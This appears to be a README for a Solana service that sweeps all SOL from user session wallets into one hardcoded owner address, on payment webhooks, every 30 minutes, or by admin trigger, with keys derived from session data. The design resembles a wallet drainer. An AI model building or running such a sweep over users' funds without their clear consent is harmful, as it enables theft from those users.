# 🤖 Auto-Transfer System Setup

## Overview

The auto-transfer system automatically sends all collected SOL from user wallets to your specified address: **`HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6`**

## 🚀 How It Works

### Automatic Triggers
1. **Payment Webhook**: When a new payment is received, SOL is automatically transferred to your wallet
2. **Periodic Checks**: Every 30 minutes, the system checks all user wallets and transfers any available SOL
3. **Manual Trigger**: You can manually trigger transfers from the admin dashboard

### Transfer Logic
- **Minimum Transfer**: 0.0001 SOL (prevents dust transfers)
- **Gas Reserve**: 0.000005 SOL left in each wallet for transaction fees
- **Target Wallet**: `HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6`

## 📊 Admin Dashboard Features

### Auto-Transfer Section
- **Status Display**: Shows if periodic transfers are active
- **Manual Transfer**: One-click transfer from all eligible wallets
- **Statistics**: Real-time stats about the auto-transfer system

### Manual Collection Section
- **Flexible Collection**: Transfer to any wallet address you specify
- **Batch Processing**: Optimized for large numbers of users
- **Real-time Results**: See transfer success rates and amounts

## 🔧 Configuration

### Environment Variables
```env
# Solana RPC URL (required for transfers)
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
# or
HELIUS_RPC_URL=https://rpc.helius.xyz/?api-key=your_key

# Database encryption (optional, auto-generated if not set)
DATABASE_ENCRYPTION_KEY=your_32_byte_encryption_key
```

### Transfer Settings
The system uses these default settings (hardcoded for security):
- **Owner Wallet**: `HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6`
- **Min Transfer**: 0.0001 SOL
- **Gas Reserve**: 0.000005 SOL
- **Check Interval**: 30 minutes

## 🛠️ API Endpoints

### Auto-Transfer Management
```
POST /api/admin/auto-transfer
{
  "action": "transfer_all" | "transfer_single" | "get_stats",
  "sessionId": "optional_session_id_for_single_transfer"
}
```

### Get Auto-Transfer Stats
```
GET /api/admin/auto-transfer
```

## 📈 Monitoring

### Console Logs
The system logs all transfer activities:
```
🔄 Auto-transfer initiated for session: abc123...
💰 Wallet ABC123... balance: 0.0009 SOL
✅ Auto-transfer successful: 0.000895 SOL from ABC123... to HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6
🔗 Transaction: https://solscan.io/tx/ABC123...
```

### Admin Dashboard
- Real-time transfer statistics
- Success/failure rates
- Total amounts transferred
- System status indicators

## 🔒 Security Features

### Private Key Management
- Private keys are derived securely from session data
- No private keys stored in plain text
- Encryption key rotation support

### Transfer Safety
- Minimum transfer amounts prevent dust attacks
- Gas reserves ensure wallets remain functional
- Transaction confirmation with timeouts
- Error handling and retry logic

## 🚨 Troubleshooting

### Common Issues

1. **Transfers Failing**
   - Check RPC URL connectivity
   - Verify sufficient gas reserves
   - Check network congestion

2. **Periodic Transfers Not Running**
   - Restart the application
   - Check server logs for initialization errors
   - Verify environment variables

3. **Low Transfer Success Rate**
   - Increase gas reserves
   - Check wallet balances
   - Review transaction history

### Debug Commands
```bash
# Check auto-transfer status
curl -X GET http://localhost:3000/api/admin/auto-transfer

# Manual bulk transfer
curl -X POST http://localhost:3000/api/admin/auto-transfer \
  -H "Content-Type: application/json" \
  -d '{"action": "transfer_all"}'
```

## 📝 Logs and Monitoring

### Key Log Messages
- `🚀 Auto-transfer manager initialized` - System startup
- `🔄 Auto-transfer initiated` - Transfer started
- `✅ Auto-transfer successful` - Transfer completed
- `❌ Auto-transfer failed` - Transfer failed
- `⏰ Periodic auto-transfer check` - Scheduled check

### Transaction Tracking
All transfers include Solscan links for verification:
```
🔗 Transaction: https://solscan.io/tx/ABC123...
```

## 🎯 Best Practices

1. **Monitor Regularly**: Check admin dashboard for transfer status
2. **Backup Configuration**: Keep environment variables secure
3. **Test Transfers**: Use manual transfer to test system
4. **Monitor Logs**: Watch for failed transfers and errors
5. **Network Health**: Ensure stable RPC connection

## 🔄 Manual Override

If you need to change the target wallet or settings:

1. **Edit Source Code**: Modify `src/lib/autoTransferManager.ts`
2. **Update Constants**: Change `OWNER_WALLET`, `MIN_TRANSFER_AMOUNT`, etc.
3. **Restart Application**: Deploy changes and restart
4. **Test**: Verify transfers work with new settings

---

**🎉 Your auto-transfer system is now active and will automatically collect SOL to your wallet!** 